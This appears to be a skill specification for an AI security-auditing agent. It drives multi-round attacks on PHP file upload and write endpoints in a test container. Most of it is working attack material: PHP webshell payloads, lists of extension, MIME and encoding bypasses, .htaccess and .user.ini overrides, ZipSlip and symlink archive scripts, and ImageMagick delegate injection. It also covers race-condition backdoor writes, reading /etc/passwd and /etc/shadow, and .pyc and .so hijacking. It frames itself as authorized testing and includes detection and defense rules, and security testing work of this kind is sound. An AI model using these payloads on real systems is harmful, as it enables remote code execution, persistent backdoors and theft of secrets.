> **Skill ID**: S-044-B | **Phase**: 4 | **Stage**: 2 (Attack)
> **Input**: attack_plans/{sink_id}_plan.json, Docker container access
> **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py


## Identity

| Field | Value |
|-------|-------|
| Skill ID | S-044-B |
| Phase | Phase-4 (Attack) |
| Responsibility | Execute progressive multi-round attack against File Write / Upload sinks |

## Input Contract

| File | Source | Required | Fields Used |
|------|--------|----------|-------------|
| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
| Container | Docker `php` container | ✅ | `exec` access |

## 🚨 CRITICAL Rules

| # | Rule | Consequence |
|---|------|-------------|
| CR-1 | Every `confirmed` verdict MUST have physical HTTP evidence: request URL + method + payload + response status + observable outcome | FAIL — evidence fabrication, finding rejected by QC |
| CR-2 | MUST NOT exceed 8 attack rounds — if stuck after round 6, execute Smart Pivot or Smart Skip | FAIL — resource exhaustion, blocks other auditors |
| CR-3 | MUST NOT attack routes not assigned in the task package — stay within allocated sink scope | FAIL — scope violation, duplicate work with other auditors |
| CR-4 | MUST read `$WORK_DIR/attack_plans/{sink_id}_plan.json` from Stage-1 before starting — do NOT re-analyze from scratch | FAIL — ignores Stage-1 analysis, wastes rounds on already-assessed vectors |
| CR-5 | MUST write exploit result to `$WORK_DIR/exploit_results/{sink_id}_result.json` conforming to `schemas/exploit_result.schema.json` | FAIL — downstream QC and report generation cannot process non-conformant output |
| CR-6 | MUST verify file was actually written by reading it back via a separate request — upload response alone is insufficient | FAIL — file processed but not persisted |

## 8-Round Attack

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R1 - Direct PHP Webshell Write

Goal: Write a .php file containing executable code to the web root directory.

Payload:
- Filename: `shell_proof.php`
- Content: `<?php echo "WRITE_PROOF"; system($_GET['cmd']); ?>`

Test all parameters that control the output filename in file_put_contents, fwrite, or move_uploaded_file. Try absolute paths (`/var/www/html/shell_proof.php`) and relative paths (`../../shell_proof.php`).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R2 - Encoded Filename Bypass

Goal: Bypass suffix/extension validation through filename encoding.

Payload:
- URL encoding: `shell_proof%2ephp`
- Double encoding: `shell_proof%252ephp`
- Unicode dot: `shell_proof\u002ephp`
- Right-to-left override: `shell_proof\u202ephp.jpg` (displays as jpg, parsed as php)

Target filters that use `pathinfo()` or regex-based extension matching. Confirm whether the file is created on disk with a .php extension.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R3 - .htaccess Modification

Goal: Modify .htaccess to allow non-PHP files to execute as PHP.

Payload:
- Write `.htaccess`: `AddType application/x-httpd-php .jpg`
- Or: `<FilesMatch "\.jpg$">\nSetHandler application/x-httpd-php\n</FilesMatch>`

Then upload `shell_proof.jpg` containing PHP code. Confirmed if the server processes it as PHP.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R4 - Double Extension & MIME Confusion

Goal: Use double extensions to bypass extension checks.

Payload:
- `shell_proof.php.jpg` (may be parsed as PHP when Apache handler is misconfigured)
- `shell_proof.php;.jpg` (Nginx path parsing)
- `shell_proof.php%00.jpg` (null byte in filename, legacy systems)

Also test MIME type mismatch: set Content-Type to `image/jpeg` but upload PHP content. Determine whether the server validates content against headers.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R5 - Case Variation & Alternative Extension Bypass

Goal: Exploit case-insensitive handling or alternative extension processing.

Payload:
- Case variants: `shell_proof.pHp`, `shell_proof.PhP`, `shell_proof.PHP`
- Alternative extensions: `.phtml`, `.pht`, `.phps`, `.php5`, `.php7`, `.phar`
- `.php3`, `.php4`, `.inc`

Test each variant against upload filters. On Linux, filenames are case-sensitive, but Apache/PHP configuration may accept all variants.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R6 - Image Polyglot File (GIF89a + PHP)

Goal: Create a file that passes image validation but contains PHP.

Payload:
- `GIF89a<?php system($_GET['cmd']); ?>` + .gif extension
- Use exiftool to embed PHP into real JPEG EXIF data
- Embed PHP in PNG tEXt chunk
- Prepend valid BMP header before PHP code

Can bypass `getimagesize()`, `mime_content_type()`, and `finfo_file()` analysis. Combine with R3 (.htaccess) to execute images as PHP.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R7 - Race Condition Upload

Goal: Exploit the time window between file upload and security check.

Steps:
1. Identify the upload flow: save file first, then validate, delete if invalid
2. Rapidly upload `shell_proof.php` in a high-concurrency loop
3. Simultaneously request `shell_proof.php` in a parallel loop
4. If the file is accessible before deletion, execute a payload that writes a persistent backdoor

Upload file payload:
```php
<?php file_put_contents('/var/www/html/shell_proof.php', '<?php echo "RACE_WIN"; system($_GET["cmd"]); ?>'); ?>
```

Use 50-100 concurrent threads for both upload and access.

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R8 - ZIP Path Traversal & Combination Attack

Goal: Exploit ZipArchive::extractTo to write files outside the target directory.

Steps:
1. Craft a ZIP file containing an entry with the path `../../../var/www/html/shell_proof.php`
2. Upload the ZIP to functionality that extracts archives (theme upload, plugin install, import)
3. Confirm the shell has been written to the web root

Combination variants:
1. ZIP contains `.htaccess` (AddType php for .txt) + `shell.txt` (PHP code)
2. Extraction places both in the web directory
3. Accessing shell.txt executes as PHP

Also test: symlinks in ZIP pointing to `/etc/passwd`, tar path traversal (if tar extraction is used).

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R9 - ImageMagick / GD Library Exploitation

Goal: Achieve file write or command execution through image processing libraries.

- **ImageMagick Delegate Injection**:
  ```
  push graphic-context
  viewbox 0 0 640 480
  image over 0,0 0,0 'ephemeral:|id > /tmp/im_proof'
  pop graphic-context
  ```
  - Trigger Delegate commands via SVG/MVG format
  - CVE-2016-3714 (ImageTragick): `https://example.com"|id > /tmp/proof"`
- **GD Library PHP Code Embedding**:
  - Retain PHP code after `imagecreatefrompng()` processing
  - Embed PHP webshell in IDAT chunk
  - MUST bypass `imagecopyresampled()` and similar processing

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R10 - Log File Write → RCE

Goal: Write malicious code via controllable log content.

- Laravel log: `storage/logs/laravel.log` contains exception details
- Monolog custom Handler writes to predictable paths
- Inject PHP code via exception messages → LFI include of log file
- Steps:
  1. Send a request containing `<?php system('id'); ?>` to trigger an exception
  2. The exception is written to the log file
  3. Include the log file via LFI → RCE
- Log rotation exploitation: `laravel-2024-01-01.log` has a predictable filename

#### Round Fill-in

| Field | Fill-in Value |
|-------|---------------|
| target_url | `{URL from attack plan}` |
| injection_point | `{parameter name from plan}` |
| payload | `{payload from this round's strategy}` |
| evidence_command | `{docker exec or curl command to verify}` |
| expected_evidence | `{what confirms success}` |

### R11 - Temporary File Exploitation

- Exploitation of `php://temp` and `php://memory`
- `sys_get_temp_dir()` + predictable filenames
- `tempnam()` race condition
- PHP Session files: `/tmp/sess_<PHPSESSID>` with controllable content
- PHP upload temp files: `/tmp/php*` + phpinfo() path leak → race condition include

## Workflow

1. Map all file write operations in the application through code review or traffic analysis
2. Execute R1 through R8 in order, escalating progressively after filter bypass failures
3. After each write attempt, confirm file existence via HTTP request and `docker exec cat`
4. Record the filename, content, headers, and server response for each upload request
5. Upon confirmation, document the complete attack chain
6. Generate a report after all rounds are complete

## Detection (Vulnerability Pattern Recognition)

The following code patterns indicate potential file write/upload vulnerabilities:
- Pattern 1: `move_uploaded_file($_FILES['f']['tmp_name'], $uploadDir . $_FILES['f']['name'])` — Original filename used directly without renaming
- Pattern 2: `file_put_contents($path . $userInput, $content)` — User-controllable write path, potential path traversal
- Pattern 3: `if(pathinfo($name, PATHINFO_EXTENSION) !== 'php') { move_uploaded_file(...) }` — Extension blacklist can be bypassed via `.phtml`/`.phar`/case variation/double extension
- Pattern 4: `$zip->extractTo($targetDir)` — ZipArchive extraction without path validation, ZipSlip attack
- Pattern 5: `if(getimagesize($file)) { move_uploaded_file(...) }` — Only validates image header, GIF89a+PHP polyglot can bypass
- Pattern 6: `.htaccess` or `.user.ini` uploadable — Changes server parsing rules, allowing non-PHP files to execute as PHP

## Key Insight

> **Key point**: The core contradiction in file write auditing is "inconsistent parsing of the same filename between the security-check component and the file-execution component." The safest defense is to not trust the original filename (server-generated random name + storage outside web root + proxy script for access), rather than stacking extension/MIME/magic bytes analysis. ZIP extraction and .htaccess upload are the two most commonly overlooked attack surfaces.

### Smart Pivot (Stuck Detection)

When 3 consecutive rounds fail (current round ≥ 4), trigger a Smart Pivot:

1. Re-reconnaissance: Re-read target code to find overlooked filter logic and alternative entry points
2. Cross-intelligence: Consult the shared findings store (`$WORK_DIR/audit_session.db`) for related discoveries from other specialists
3. Decision tree matching: Select a new attack direction based on failure patterns in `shared/pivot_strategy.md`
4. If no new path is found, terminate early to avoid wasting rounds producing hallucinated results

## Prerequisites & Scoring (MUST be completed)

The output `exploits/{sink_id}.json` MUST include the following two objects:

### prerequisite_conditions
```json
{
  "auth_requirement": "anonymous|authenticated|admin|internal_network",
  "bypass_method": "Authentication bypass method, null if none",
  "other_preconditions": ["Precondition 1", "Precondition 2"],
  "exploitability_judgment": "directly_exploitable|conditionally_exploitable|not_exploitable"
}
```
- `auth_requirement` MUST match the auth_level for this route in auth_matrix.json
- `exploitability_judgment = "not_exploitable"` → final_verdict SHALL be at most potential
- `other_preconditions` MUST list all non-authentication prerequisites (e.g., PHP configuration, Composer dependencies, environment variables)

### severity (Three-Dimensional Scoring, see shared/severity_rating.md for details)
```json
{
  "reachability": 0-3, "reachability_reason": "...",
  "impact": 0-3, "impact_reason": "...",
  "complexity": 0-3, "complexity_reason": "...",
  "score": "R×0.40+I×0.35+C×0.25",
  "cvss": "(score/3.0)×10.0",
  "level": "C|H|M|L",
  "vuln_id": "C-RCE-001"
}
```
- All reason fields MUST contain specific justification and MUST NOT be empty
- score and evidence_score MUST be consistent (≥2.10→≥7, 1.20-2.09→4-6, <1.20→1-3)

### Evidence Contract Reference (EVID)

Each vulnerability conclusion MUST reference the following evidence points in the `evidence` field (refer to `shared/evidence_contract.md`):
- `EVID_WRITE_CALLSITE` — Write call site ✅ Required
- `EVID_WRITE_DESTPATH_RESOLVED` — Resolved destination path ✅ Required
- `EVID_WRITE_CONTENT_SOURCE` — Write content source ✅ Required
- `EVID_WRITE_EXEC_ACCESSIBILITY` — Execution accessibility ✅ Required
- `EVID_WRITE_UPLOAD_RESPONSE` — Upload response evidence (required when confirmed)

Missing required EVID → conclusion is automatically downgraded (confirmed→suspected→unverified).

### Attack Memory Write

After the attack cycle ends, write experience to the attack memory store (see `shared/attack_memory.md` for write protocol):

- ✅ confirmed: Record successful payload type + bypass technique + successful round
- ❌ failed (≥3 rounds): Record all excluded strategies + failure reasons
- ⚠️ partial: Record partially successful strategies + blocking reasons
- ❌ failed (<3 rounds): Do not record

Use `bash tools/audit_db.sh memory-write '<json>'` to write; SQLite WAL mode automatically ensures concurrent safety.

## Output

After completing all rounds, write the final result to `$WORK_DIR/exploits/{sink_id}.json`.

> **MUST strictly follow the fill-in template in `shared/OUTPUT_TEMPLATE.md` to generate the output file.**
> JSON structure MUST conform to `schemas/exploit_result.schema.json`; field constraints are defined in `shared/data_contracts.md` Section 9.
> Before submission, execute the 3 validation commands at the bottom of OUTPUT_TEMPLATE.md.

## Archive Extract / Zip Slip Attack Extension

When the target code uses `ZipArchive`, `PharData`, `tar` extraction, or the `unzip` command to process user-uploaded archive files, analyze the following attack vectors:

### Target Functions

- `ZipArchive::extractTo()` — PHP native ZIP extraction
- `PharData::extractTo()` — Phar/tar/zip extraction
- `$zip->getStream($name)` + `file_put_contents()` — Manual extraction to disk
- `exec("unzip ...")` / `exec("tar xf ...")` — Command-line extraction
- Laravel `Storage::putFileAs()` combined with extraction logic
- Third-party libraries such as `maennchen/zipstream-php`

### Zip Slip Attack Strategies

**R-ZIP-1: Basic Path Traversal**
Craft a malicious ZIP file with entry names containing `../`:
- Entry name: `../../../etc/cron.d/evil` — Write to system directory
- Entry name: `../../public/shell.php` — Write to web root
- Entry name: `../.env` — Overwrite environment configuration

Confirmation method: Upload malicious ZIP → analyze whether files are created outside the expected directory after extractTo

**R-ZIP-2: Symlink Attack**
Symlink entries in ZIP files:
- Create a symlink entry pointing to `/etc/passwd` → read after extraction
- Create a symlink pointing to `../../.env` → read via subsequent interface

**R-ZIP-3: Filename Encoding Bypass**
- UTF-8 BOM prefix: `\xEF\xBB\xBF../`
- Double encoding: `..%252f`
- Windows-specific: `..\\`, `..\\/`
- Null byte: `file.php%00.jpg` (PHP < 5.3.4)

**R-ZIP-4: ZIP Bomb / Decompression Bomb**
- Extremely high compression ratio files (42.zip principle) → disk exhaustion
- Excessive file entries (>100000) → inode exhaustion
- Deeply nested ZIPs (ZIP within ZIP) → recursive extraction DoS

### Detection Patterns

- `ZipArchive::extractTo($dir)` without validating entry filenames
- Failure to check whether `$zip->getNameIndex($i)` contains `..` before extraction
- `$entry->getPathname()` not verified via `realpath()` to be within the target directory
- Extraction to a user-controllable path: `extractTo($_POST['dir'])`

### Evidence Collection

1. Locate archive processing code (ZipArchive/PharData instantiation + extractTo calls)
2. Locate filename validation logic (whether `../` is filtered, whether `basename()` is used, whether realpath validation is applied)
3. Craft a malicious ZIP and upload it; confirm whether files can be written outside the target directory
4. Analyze post-extraction file cleanup logic

## Constraints

- MUST only write files named shell_proof.php or temporary test files
- MUST clean up test artifacts after confirmation when possible
- MUST NOT overwrite critical application files
- MUST comply with authorization scope

---

## .htaccess Upload Attack

.htaccess is Apache's directory-level configuration file. If an attacker can upload or overwrite this file, they can fully control the parsing behavior of files within the directory.

### Attack Step 1: Upload Malicious .htaccess

Upload content:
```
AddType application/x-httpd-php .xxx
```
Or more fine-grained control:
```
<FilesMatch "\.(txt|log|dat|xxx)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

This causes any `.xxx` (or .txt/.log/.dat) extension file to be parsed and executed as PHP by Apache.

### Attack Step 2: Upload Webshell with Arbitrary Extension

Upload `shell_proof.xxx` with content:
```php
<?php echo "HTACCESS_PROOF"; system($_GET['cmd']); ?>
```

Accessing `http://target/uploads/shell_proof.xxx` triggers PHP parsing, achieving RCE.

### Apache ErrorDocument Expression File Read

Exploit the `ErrorDocument` directive in `.htaccess` combined with Apache expressions:
```
ErrorDocument 404 %{file:/etc/passwd}
```

When a non-existent file is requested, Apache returns the contents of `/etc/passwd` as the 404 error page.

More advanced exploitation:
```
ErrorDocument 404 %{file:/var/www/html/config/database.php}
```
Can read database configuration, keys, and other sensitive information.

### Complete Two-Step Attack Flow

1. **Step 1**: Upload `.htaccess` via the file upload interface
   - Bypass method: Some filters do not analyze filenames starting with `.`
   - Or extract `.htaccess` to the target directory via ZIP extraction
   - Or write directly using `file_put_contents`

2. **Step 2**: Upload a Webshell with a disguised extension
   - Use harmless extensions such as .txt/.jpg/.xxx for the filename
   - Content is a complete PHP webshell
   - Apache executes it as PHP according to the new .htaccess rules

3. **Test**: `curl http://target/uploads/shell_proof.xxx?cmd=id` returns command execution result

### Detection Rules

- Monitor creation and modification events of `.htaccess` files in upload directories
- Check whether the target filename of `file_put_contents`/`fwrite`/`move_uploaded_file` is `.htaccess`
- Audit whether `AllowOverride` is set to `None` in Apache configuration (recommended)
- Block upload requests with filenames matching `^\.ht` at the WAF layer
- Periodically scan web directories for unexpected `.htaccess` files

### Key Insight

> The core of .htaccess attacks lies in the "two-step approach": Step 1 changes server parsing rules, Step 2 exploits the new rules to execute malicious code. Defense MUST cover both steps simultaneously — prohibit .htaccess uploads **AND** disable AllowOverride at the Apache level. Defending only one step can be bypassed by combination attacks.

---

## ZIP Upload Webshell

ZIP file upload followed by extraction is a common business scenario (theme installation, batch import, plugin upload). Attackers can exploit the internal structure of ZIP files for various attacks.

### ZIP Containing .php → Extract and Execute

Craft a ZIP file containing a PHP webshell:
```bash
echo '<?php echo "ZIP_PROOF"; system($_GET["cmd"]); ?>' > shell_proof.php
zip malicious.zip shell_proof.php
```

If the server extracts the ZIP to a web-accessible directory without analyzing the extracted file types, a Webshell is obtained directly.

Advanced variants:
- Nested directory structure in ZIP: `assets/images/../../../shell_proof.php`
- Multiple files in ZIP with one .php file mixed in (exploiting oversight during batch processing)
- ZIP Bomb: Extremely high compression ratio files for DoS or bypassing post-size-limit scanning

### ZipSlip (Symlink + Path Traversal)

**Path Traversal ZipSlip**:
```python
import zipfile
with zipfile.ZipFile('zipslip.zip', 'w') as zf:
    zf.write('shell.php', '../../../var/www/html/shell_proof.php')
```

**Symlink ZipSlip**:
```bash
ln -s /etc/passwd link
zip --symlinks symlink.zip link
```

After upload and extraction, the `link` file points to `/etc/passwd`, readable via web access.

More dangerous combination:
```bash
ln -s /var/www/html/ webroot
zip --symlinks stage1.zip webroot
# After extraction, webroot is a symlink pointing to the web root
# Second ZIP upload, extracting to the webroot/ directory writes to the web root
```

### Disabled Function Alternatives

When `system()`/`exec()`/`shell_exec()` are disabled via `disable_functions`:

- **`file_get_contents()`**: Read arbitrary server files
  ```php
  <?php echo file_get_contents('/etc/passwd'); ?>
  ```
- **`readfile()`**: Output file contents directly to browser
  ```php
  <?php readfile('/etc/shadow'); ?>
  ```
- **`show_source()` / `highlight_file()`**: Display PHP source code with syntax highlighting
  ```php
  <?php show_source('/var/www/html/config/database.php'); ?>
  ```
- **`scandir()` + `file_get_contents()`**: Directory traversal + file read combination
- **`glob()`**: File search for discovering sensitive file paths
- **`finfo_file()` + `SplFileObject`**: Object-oriented file reading

### Detection Rules

- Check whether the target path of `ZipArchive::extractTo` is normalized (`realpath()` analysis)
- Scan file extensions after extraction; delete executable files such as `.php`/`.phtml`/`.phar`
- Detect whether entry paths in the ZIP contain `../` or absolute paths
- Detect whether the ZIP contains symlinks (`ZipArchive::getExternalAttributesIndex`)
- Monitor file creation events outside the extraction directory

### Key Insight

> The essence of ZIP attacks is "trusting container content" — the server trusts filename and path information inside the ZIP. Defense MUST independently validate each file after extraction: verify realpath is within the expected directory, check file extensions, and detect symlinks. `ZipArchive::extractTo` itself performs no security checks.

---

## Extension Bypass Quick Reference

File upload filters typically use extension-based blacklist/whitelist analysis. The following lists ≥ 10 bypass methods.

### 1. PHP Alternative Extensions

- `.phtml` — Parseable under most default Apache configurations
- `.php5` — PHP 5.x environments
- `.php7` — PHP 7.x environments
- `.phar` — PHP Archive, executable as PHP
- `.phps` — PHP Source, executable under some configurations
- `.pht` — Less common but still supported by some configurations
- `.php3` / `.php4` — Legacy version extensions
- `.inc` — Commonly used for include files, some server configurations parse as PHP

### 2. Mixed Case

- `.PhP`, `.PHP`, `.pHp`, `.PHp`, `.phP`
- Windows/macOS file systems are case-insensitive; Linux is case-sensitive but Apache configuration may not be
- Targets filters that check before applying `strtolower()`

### 3. Double Extension

- `shell.php.jpg` — Apache parses left-to-right under certain `mod_mime` configurations
- `shell.php.xxx` — If `.xxx` has no registered MIME type, Apache falls back to `.php`
- `shell.php.` — Trailing dot, automatically removed by Windows

### 4. Null Byte Truncation

- `shell.php%00.jpg` — In PHP < 5.3.4, `%00` truncates the filename
- `shell.php\x00.jpg` — Raw null byte injection

### 5. Content-Type Forgery

- Set Content-Type to `image/jpeg` or `image/png` when uploading a PHP file
- Filters relying solely on `$_FILES['file']['type']` can be completely bypassed
- This value is client-controlled and MUST NOT be trusted server-side

### 6. Magic Bytes Forgery

- Prepend `GIF89a` (GIF header) before PHP code
- Prepend `\x89PNG\r\n\x1a\n` (PNG header)
- Prepend `\xff\xd8\xff\xe0` (JPEG header)
- Can bypass `finfo_file()`, `getimagesize()`, `mime_content_type()` analysis

### 7. Special Character Injection

- `shell.php;.jpg` — Nginx path parsing vulnerability
- `shell.php/.` — Apache path normalization
- `shell.php::$DATA` — Windows NTFS ADS (Alternate Data Stream)
- `shell.php%20` — Trailing space, automatically removed by Windows
- `shell.php...` — Trailing dots, automatically removed by Windows

### 8. Newline Injection (CVE-2017-15715)

- `shell.php\n` or `shell.php\x0a`
- In Apache 2.4.0-2.4.29, `$` in `<FilesMatch>` does not match newline characters
- Regex `\.php$` does not match `shell.php\n`, but the PHP handler still parses it

### 9. .user.ini Exploitation

- Upload `.user.ini` to a directory containing PHP files
- Content: `auto_prepend_file=shell.jpg`
- Then upload `shell.jpg` containing PHP code
- Any PHP file in that directory will include `shell.jpg` first upon execution

### 10. Path Truncation & Encoding Combinations

- URL double encoding: `shell%252ephp` → decoded twice to `shell.php`
- Unicode encoding: `shell\u002ephp`
- Overlong UTF-8: `shell.ph\xc0\xf0` equivalent to `shell.php` in some parsers
- Right-to-left override character (RTLO): `shell\u202egod.php` displays as `shellphp.dog`

### 11. Race Condition Bypass

- Upload a legitimate file to pass validation, then exploit race condition to replace with PHP file
- Access and execute within the time window before deletion

### Detection Rules

- Use whitelists instead of blacklists for extension validation
- Normalize to lowercase before extension check: `strtolower(pathinfo($name, PATHINFO_EXTENSION))`
- Validate both file content (magic bytes) and extension simultaneously; both MUST match
- Prohibit special characters such as `%00`, `\n`, `\r`, `::$DATA` in filenames
- Normalize paths using `realpath()` before performing security checks
- Rename uploaded files to random names + whitelisted extensions

### Key Insight

> The core contradiction in extension bypass is: inconsistent parsing of the same filename between the security-check component and the file-execution component. The best defense practice is "do not trust the original filename" — rename to a server-generated random filename, store outside the web root, and access via a proxy script.

---

## Python/Ruby File Write → RCE (Hybrid Projects)

In PHP + Python/Ruby hybrid deployment projects (e.g., PHP frontend + Python ML backend, Ruby Sidekiq worker), file write vulnerabilities can achieve RCE across language boundaries.

### .so Hijacking (Shared Library Hijacking)

Python and Ruby load `.so` shared library files during `import`/`require`. If an attacker can write to specific paths, module loading can be hijacked.

**Python .so Hijacking**:
```
# Python import search order:
# 1. Current directory
# 2. PYTHONPATH
# 3. Default installation path

# If the application directory is writable, create a malicious .so:
# Write numpy.cpython-39-x86_64-linux-gnu.so
# Next import numpy will load the malicious code
```

Attack flow:
1. Write malicious `.so` to the Python application directory via a PHP file write vulnerability
2. Wait for the Python process to restart or a new import to trigger
3. The `PyInit_<module>` function in the malicious `.so` executes arbitrary code

**Ruby .so Hijacking**:
```
# Ruby require searches $LOAD_PATH
# Write malicious .so to a directory in $LOAD_PATH
# Overwrite native extension of a commonly used gem
```

### .pyc Overwriting

Python caches compiled bytecode as `.pyc` files (located in the `__pycache__/` directory). Overwriting `.pyc` files enables malicious code injection without modifying `.py` source code.

**Attack Steps**:
1. Locate the target Python module's `.pyc` file path:
   ```
   __pycache__/target_module.cpython-39.pyc
   ```
2. Craft a malicious `.pyc` file (with correct magic number and timestamp):
   ```python
   import py_compile, marshal, struct, time
   # Compile malicious code into .pyc
   code = compile('import os; os.system("id > /tmp/pyc_proof")', '<module>', 'exec')
   ```
3. Overwrite the target `.pyc` file via a PHP file write vulnerability
4. The next Python import of that module executes the malicious code

**Advanced Variants**:
- Overwrite `sitecustomize.pyc`: Automatically loaded at Python startup
- Overwrite `__init__.pyc`: Package-level initialization, affects entire package loading
- Overwrite commonly used utility modules (e.g., `utils.pyc`, `helpers.pyc`): High trigger probability

### Ruby-Specific Attack Surfaces

- **Gemfile Overwrite**: Modify `Gemfile` to add a malicious gem source
- **`.ruby-version` Overwrite**: If rbenv/rvm is used, can point to a malicious Ruby version
- **`config/initializers/*.rb` Overwrite**: Initialization scripts automatically loaded at Rails startup
- **ERB Template Overwrite**: Modify `.erb` templates to inject Ruby code

### Detection Rules

- Monitor abnormal modifications to `.pyc` files in `__pycache__/` directories (timestamp mismatch with `.py`)
- Monitor `.so` file creation events in Python/Ruby application directories
- Set `__pycache__` directory to read-only (production environments SHOULD pre-compile)
- Verify digital signatures or hash values of `.so` files
- Use `PYTHONDONTWRITEBYTECODE=1` to prevent `.pyc` generation
- Monitor file changes in directories listed in `$LOAD_PATH` and `sys.path`
- Audit cross-language-boundary file write operations (PHP process writing to Python/Ruby directories)

### Key Insight

> The attack surface of hybrid-language projects for file write vulnerabilities is far larger than single-language projects. PHP file write vulnerabilities can not only write Webshells but also affect Python/Ruby components through .so/.pyc overwriting. Defense requires unified cross-language file integrity monitoring, with particular attention to write protection for runtime dependency directories such as `__pycache__/`, `$LOAD_PATH`, and `node_modules/`.



## Output Contract

| Output File | Path | Description |
|-------------|------|-------------|
| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |

## Examples

### ✅ GOOD Example — Complete, Valid Exploit Result

```json
{
  "sink_id": "upload_avatar_001",
  "final_verdict": "confirmed",
  "rounds_executed": 4,
  "successful_round": 2,
  "payload": "shell.php.jpg with GIF89a header + <?php system($_GET['c']);?>",
  "evidence_result": "Uploaded file accessible at /uploads/shell.php.jpg, executed phpinfo() via GET ?c=phpinfo()",
  "severity": {
    "level": "C",
    "score": 2.7,
    "cvss": 9.0
  }
}
```

**Why this is good:**
- `evidence_result` contains specific, verifiable proof of exploitation
- `severity` scoring is consistent: score 2.7 → cvss 9.0 → level `C`
- `rounds_executed` shows progressive effort, not a single blind attempt
- All required fields are populated with concrete values

### ❌ BAD Example — Incomplete, Invalid Exploit Result

```json
{
  "sink_id": "upload_avatar_001",
  "final_verdict": "confirmed",
  "rounds_executed": 1,
  "successful_round": 1,
  "payload": "shell.php",
  "evidence_result": "",
  "failure_reason": "",
  "severity": {
    "level": "H",
    "score": null
  }
}
```

**Issues:**
- evidence_result is empty — no proof that uploaded file is accessible or executable
- failure_reason is empty — no upload response or access URL documented
- severity_level 'H' for webshell upload with RCE — should be C

---

## Pre-Submission Self-Check (MUST be executed)

After completing the exploit JSON, perform item-by-item self-checks per `shared/auditor_self_check.md`:

1. Execute the 8 general items (G1-G8); proceed only after all are ✅
2. Execute the specialized checks below (S1-S3); submit only after all are ✅
3. If any item is ❌ → fix and re-check; MUST NOT skip

### Specialized Self-Checks (File Upload/Write Auditor specific)
- [ ] S1: Bypass techniques (double extension/MIME forgery/truncation) are specifically annotated
- [ ] S2: The actual accessible URL of the uploaded file has been confirmed
- [ ] S3: Evidence of file content execution (not merely successful upload)

## Shared Protocols
> 📄 `skills/shared/round_record_format.md` (S-101) — Per-round JSON format
> 📄 `skills/shared/smart_skip_protocol.md` (S-102) — Smart skip
> 📄 `skills/shared/smart_pivot_protocol.md` (S-103) — Smart pivot
> 📄 `skills/shared/prerequisite_scoring_3d.md` (S-104) — 3D scoring
> 📄 `skills/shared/attack_memory_writer.md` (S-105) — Memory write
> 📄 `skills/shared/second_order_tracking.md` (S-106) — Second-order tracking
> 📄 `skills/shared/general_self_check.md` (S-108) — G1-G8 self-check
## Error Handling

| Error | Action |
|-------|--------|
| Container unreachable or crashed | Restart container, retry current round; if 2nd failure → mark `"status": "container_failed"`, skip remaining rounds |
| Target endpoint returns 500 | Reduce payload complexity, retry once; if persistent → record `"status": "target_error"`, continue next round |
| Timeout during exploitation (>AGENT_TIMEOUT_MIN) | Save partial results, set `"status": "timeout_partial"`, proceed to scoring |
| Upload directory not writable or permission denied | Test alternative upload paths and temp directories; if all fail → record `"status": "write_denied"` |
| File extension validation blocks malicious upload | Try double extension, null byte, `.htaccess` override; if all blocked → record `"status": "extension_filtered"` |
| Uploaded file content scanned and quarantined | Attempt polyglot file or obfuscated payload; if detected → record `"content_filtered": true` |
| Payload blocked by WAF/filter | Log filter type, switch to WAF-bypass payload variant; if all variants fail → record `"waf_blocked": true` |
